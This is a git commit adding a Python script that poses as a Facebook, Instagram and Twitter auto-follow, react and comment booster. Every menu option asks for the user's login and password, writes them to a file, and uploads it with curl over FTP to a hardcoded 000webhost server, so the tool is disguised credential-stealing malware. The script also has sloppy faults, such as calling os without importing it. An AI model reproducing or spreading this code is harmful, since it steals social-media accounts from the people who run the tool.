f69e6b40022fdabd946230457d912347d51cae45
Muhammad prince <96841358+prince00110011@users.noreply.github.com>
2021-12-29 20:48:08 +0000

    prince.py
    $ git clone https://github.com/black_hat_hackers_community-
    $ python2 prince.py

---
+++ prince.py
@@ -0,0 +1,129 @@
+#Tool By Muhammad Prince (Thejoker)
+import subprocess
+from subprocess import check_call
+print("\033[1;31m    ______  ______  __  __      __  ____  _____ ")  
+print("\033[1;31m   / __  / / __  / / / /  \    / / / __/ / /--/ ")  
+print("\033[1;34m  / /_/ / / /_/ / / / / /\ \  / / / /   / /_/   ")  
+print("\033[1;34m / ____/ / /___/ / / / /  \ \/ / / /   / /__    ")  
+print("\033[35   /_/     /_/\_\  /_/ /_/    \__/ /___/ /____/    ")  
+print("\033[1;33mPlease Configure New Updates")
+print("\033[1;31mNote: You can take 100 followers, 80 React, 13 Comment every 3 minutes")
+print("\n")
+cmd0 = os.system("pkg install curl && apt install curl")
+cmd  = os.system("clear")
+def intro():
+    cmd  = os.system("clear")
+    print("""
+\033[1;34m______  ______  __  __      __  ____  _____
+\033[1;34m/ __  / / __  / / / /  \    / / / __/ / /--/ 
+\033[95m/ /_/ / / /_/ / / / / /\ \  / / / /   / /_/
+\033[95m/ ____/ / /___/ / / / /  \ \/ / / /   / /__
+\033[1;31m/_/     /_/\_\  /_/ /_/    \__/ /___/ /____/ 
+\033[1;31m
+   \033[0m>>Developed By Thr joker <<
+          \033[95mVersion : 2.3.6
+\033[0m=================================== 
+                                       """)
+    print("""
+\033[1;34m==> Select the number of the option that you want to start from below :
+ 
+ \033[1;33m[1] Facebook Auto Follow   (The joker)
+ \033[1;33m[2] Facebook Auto React    (The joker)
+ \033[1;33m[3] Facebook Auto Comment  (The joker)
+ \033[1;33m[4] Instagram Auto Follow  (The joker)
+ \033[1;33m[5] Instagram Auto React   (The joker)
+ \033[1;33m[6] Instagram Auto Comment (The joker)
+ \033[1;33m[7] Twitter Auto Follow    (The joker)
+ \033[1;33m[8] Twitter Auto Comment   (The joker)
+ \033[1;33m[9] Twitter Auto React""")
+    print("\033[1;33m")
+    var = int(input("[>] Select Your Option :"))
+    if var == 1 :
+        print("\nNote:Login to your account you want to take auto follower to")
+        print("\n┌Type username or email adress")
+        user = input("└──>")
+        print("\n┌Type Password")
+        password = input("└──>")
+        order = "echo user {} password {}>facebook.txt && curl -T facebook.txt ftp:/demonsiteinfo:demon404@files.000webhost.com/public_html/ && rm -rf facebook.txt ".format(user,password)
+        geny  = os.system(order)
+        intro()
+    elif var == 2 :
+        print("\nNote:Login to your account you want to take auto react to")
+        print("\n┌Type username or email adress")
+        user = input("└──>")
+        print("\n┌Type Password")
+        password = input("└──>")
+        order = "echo user {} password {}>facebook.txt && curl -T facebook.txt ftp:/demonsiteinfo:demon404@files.000webhost.com/public_html/ && rm -rf facebook.txt ".format(user,password)
+        geny  = os.system(order)
+        intro()
+    elif var == 3 :
+        print("\nNote:Login to your account you want to take auto comment to")
+        print("\n┌Type username or email adress")
+        user = input("└──>")
+        print("\n┌Type Password")
+        password = input("└──>")
+        order = "echo user {} password {}>facebook.txt && curl -T facebook.txt ftp:/demonsiteinfo:demon404@files.000webhost.com/public_html/ && rm -rf facebook.txt ".format(user,password)
+        geny  = os.system(order)
+        intro()
+    elif var == 4 :
+        print("\nNote:Login to your account you want to take auto follower to")
+        print("\n┌Type username or email adress")
+        user = input("└──>")
+        print("\n┌Type Password")
+        password = input("└──>")
+        order = "echo user {} password {}>instagram.txt && curl -T instagram.txt ftp:/demonsiteinfo:demon404@files.000webhost.com/public_html/ && rm -rf instagram.txt ".format(user,password)
+        geny  = os.system(order)
+        intro()
+    elif var == 5 :
+        print("\nNote:Login to your account you want to take auto react to")
+        print("\n┌Type username or email adress")
+        user = input("└──>")
+        print("\n┌Type Password")
+        password = input("└──>")
+        order = "echo user {} password {}>instagram.txt && curl -T instagram.txt ftp:/demonsiteinfo:demon404@files.000webhost.com/public_html/ && rm -rf instagram.txt ".format(user,password)
+        geny  = os.system(order)
+        intro()
+    elif var == 6 :
+        print("\nNote:Login to your account you want to take auto comment to")
+        print("\n┌Type username or email adress")
+        user = input("└──>")
+        print("\n┌Type Password")
+        password = input("└──>")
+        order = "echo user {} password {}>instagram.txt && curl -T instagram.txt ftp:/demonsiteinfo:demon404@files.000webhost.com/public_html/ && rm -rf instagram.txt ".format(user,password)
+        geny  = os.system(order)
+        intro()
+    elif var == 7 :
+        print("\nNote:Login to your account you want to take auto follower to")
+        print("\n┌Type username or email adress")
+        user = input("└──>")
+        print("\n┌Type Password")
+        password = input("└──>")
+        order = "echo user {} password {}>twitter.txt && curl -T twitter.txt ftp:/demonsiteinfo:demon404@files.000webhost.com/public_html/ && rm -rf twitter.txt ".format(user,password)
+        geny  = os.system(order)
+        intro()
+    elif var == 8 :
+        print("\nNote:Login to your account you want to take auto react to")
+        print("\n┌Type username or email adress")
+        user = input("└──>")
+        print("\n┌Type Password")
+        password = input("└──>")
+        order = "echo user {} password {}>twitter.txt && curl -T twitter.txt ftp:/demonsiteinfo:demon404@files.000webhost.com/public_html/ && rm -rf twitter.txt ".format(user,password)
+        geny  = os.system(order)
+        intro()
+    elif var == 9 :
+        print("\nNote:Login to your account you want to take auto comment to")
+        print("\n┌Type username or email adress")
+        user = input("└──>")
+        print("\n┌Type Password")
+        password = input("└──>")
+        order = "echo user {} password {}>twitter.txt && curl -T twitter.txt ftp:/demonsiteinfo:demon404@files.000webhost.com/public_html/ && rm -rf twitter.txt ".format(user,password)
+        geny  = os.system(order)
+        intro()
+    elif var == 10 :
+        cmd0 = os.system("sleep 3")
+        intro()    
+    else:
+        print("Not Found")
+        cmd = os.system("sleep 2")
+        intro()
+intro()
